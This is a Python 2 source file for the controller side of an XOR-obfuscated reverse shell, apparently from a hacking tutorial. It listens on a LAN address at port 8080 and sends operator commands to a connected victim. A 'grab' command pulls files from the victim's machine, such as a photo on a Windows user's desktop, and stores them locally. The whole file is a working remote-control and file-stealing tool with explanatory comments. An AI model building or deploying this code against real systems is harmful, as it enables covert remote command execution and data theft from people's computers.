import socket # for building TCP connection
import os # needed for file operation

import random
import string

XOR_KEY = "}h6Edu<40Zw9]lo1T9r2+?[9qxSyj2+Vei,KAK?N,c-encw-e2X$V]Vq0z~sK#D7<8!qaZ.}-oM=[u50z|Z6IMdwAW_UsIW0nm6%U;ZFoOLfYJ&KFLBTm(S!Ea?4(skIw41gXh?|dnb5pb2}He88f!2ph#=Z8QjN;D!HokMJ(VM:1R+ARrGo<JV1~Ly5zt>?x2<Uvx02<f2e|6X_p&7qm>B5DI[wcPidjDF{80e%pw5h5(TI)YNx~2o<FoLqOk8bH8A]>s0j>_-&aT{qh2;OHuSBd]Uc$KY{y,h98u6)!mbMLA?A,-t?f8R,w>856[{Z2,-+_YSyBW|0P2LQ)-6O,h|oQwAaEvLCMreE}7fq1RQ+825a.=-O%q.pus>=_uMG1Z7vB=2mD6Jo8%bO11Je;)br{wgKf257C(+zPHG.RB$~f;}}!8}-;)#I}#rVUQU{j18=ONe5Lp{5b9^tn3UvE>0CUwI$dbUxVb!+X=GZq$}I0;y>9YK6{Nko1pn};}TFvd^0At~BOl?FV>1E&oswdP|fgV==eaRz#3thU6zljYIQSai41Xcr,M)h#O,^XJ_~MMBh#U^%mqR-Ow]ezpxxt#T%UUN0{-3m70)Zl:+#F[rrOzZ5]Cif2Ssn]cNJV{bT^{||Ww)mHtS~KG-h+JdL!~QdL<#_9[#:i<7}>m}z4BlVuPROcvp$(Z.7?Ew(q:,:t|eVW[tRK4)(-:DJC?XDEfZ6=b;O:oMdh9;kGcPvmi-]LM>{lb^&>W(ixB.>$x%Wm,An~S!f!u:Ui_!yb9:%xkP2+^?fXmh4}}95kDW%IV!F,m=119Lm4#E]KbUR(ON}G-_bu#e)?<[m?%3O[]a;khJt7B&t^d8dk^zutGy}vPX1#$p(FQ#y0L}+JLFVRH{PUBk}%}g-marM6dzC}t]Ced+sEFLkLu9R9FK)uo1KgS+N6:=bi;[|usY<sL0d)AOBE(v29_>30K1E=}k9h_]$^c]TE7:LDsF}}.n-X]rND(T[qvQ^IHrM<6av(u50A%1W"


# function to en/decrypt messages - just one function, because xor operation for en/decrpyt is the same, just parameter matters
# params enc: s1 message, s2 xor key
# params dec: s1 encrypted message, s2 xor key
#
# first we split the message and the xor key to a list of character pair in tuples format >> for (c1,c2) in zip(s1,s2)
# next we will go through each tuple, and converting them to integer using (ord) function
# once they converted into integers we can now perform exclusive OR on them  >>  ord(c1) ^ ord(c2)
# last step we will merge the resulting array of characters as a sequqnece string using >>>  "".join function
def str_xor(s1, s2):
    return "".join([chr(ord(c1) ^ ord(c2)) for (c1,c2) in zip(s1,s2)])



def transfer(conn, command):
    conn.send(str_xor(command, XOR_KEY))
    # create placeholder file
    f = open('/root/Desktop/filex.xy', 'wb')

    # infinite loop and store received data into our placeholder
    # break loop at file end (Done) or if it does not exist
    while True:
        print 'receiving ...'
        #enc_bits = conn.recv(1024)
        bits =  str_xor(conn.recv(1024), XOR_KEY)
        if 'Unable to find out the file' in bits:
            print '[-] Unable to find out the file'
            break
        if bits.endswith('DONE'):
            print '[+] Transfer completed'
            f.close()
            break
        f.write(bits)

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # to prevent "socket.error: [Errno 98] Address already in use" (socket is in a TIME_WAIT state)
    # we set a flag to prevent this
    # SO_REUSEADDR flag tells the kernel to reuse a local socket in TIME_WAIT state, without waiting for its natural timeout to expire
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("192.168.100.187", 8080))
    s.listen(1) # listen for single connection
    print '[+] Listening for incoming TCP connection on port 8080'
    conn, addr = s.accept() # addr -> IP:Port
    print 'We got a connection from: ', addr

    while True:
        command = raw_input("Shell> ")
        if 'terminate' in command:
            conn.send(str_xor('terminate', XOR_KEY))
            conn.close() # close the connection with host
            break

        # if we receive grab keyword from user input, then this is an indicator
        # for file transfer operation
        #
        # grab formula is grab*<file path>
        # Example: grab*C:\Users\XY\Desktop\photo.jpg
        elif 'grab' in command:
            transfer(conn, command)

        # we did not enter a command
        elif command == '':
            # send 'random' command (in that case whoami) to not break the shell
            conn.send(str_xor('whoami', XOR_KEY))
            print str_xor(conn.recv(1024), XOR_KEY)

        else:
            # send command
            conn.send(str_xor(command, XOR_KEY))
            print str_xor(conn.recv(1024), XOR_KEY)

def main():
    connect()

main()
